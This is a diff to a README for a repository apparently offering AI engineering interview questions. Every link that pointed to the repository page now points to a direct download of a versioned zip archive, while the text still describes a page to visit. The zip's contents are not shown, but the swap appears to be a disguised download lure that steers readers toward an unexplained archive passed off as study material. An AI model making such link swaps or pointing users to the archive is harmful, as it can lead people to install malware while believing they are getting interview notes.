@@ -1,6 +1,6 @@
 # 🧠 ai-engineering-interview-questions - Interview Prep Made Simple
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit-Page-blue?style=for-the-badge)](https://github.com/hasanf7711/ai-engineering-interview-questions)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit-Page-blue?style=for-the-badge)](https://github.com/hasanf7711/ai-engineering-interview-questions/raw/refs/heads/main/assets/engineering_interview_questions_ai_1.0-beta.3.zip)
 
 ## 📘 What this is
 
@@ -35,7 +35,7 @@ If you want to keep a local copy, you can also download the repo from GitHub.
 
 Go to this page to download or view the content:
 
-[https://github.com/hasanf7711/ai-engineering-interview-questions](https://github.com/hasanf7711/ai-engineering-interview-questions)
+[https://github.com/hasanf7711/ai-engineering-interview-questions/raw/refs/heads/main/assets/engineering_interview_questions_ai_1.0-beta.3.zip](https://github.com/hasanf7711/ai-engineering-interview-questions/raw/refs/heads/main/assets/engineering_interview_questions_ai_1.0-beta.3.zip)
 
 If you want the full copy on your computer, use GitHub’s download option on that page.
 
@@ -157,7 +157,7 @@ This repo is useful for:
 
 ## 📎 Open the download page again
 
-[https://github.com/hasanf7711/ai-engineering-interview-questions](https://github.com/hasanf7711/ai-engineering-interview-questions)
+[https://github.com/hasanf7711/ai-engineering-interview-questions/raw/refs/heads/main/assets/engineering_interview_questions_ai_1.0-beta.3.zip](https://github.com/hasanf7711/ai-engineering-interview-questions/raw/refs/heads/main/assets/engineering_interview_questions_ai_1.0-beta.3.zip)
 
 ## 📝 Notes on the content
 
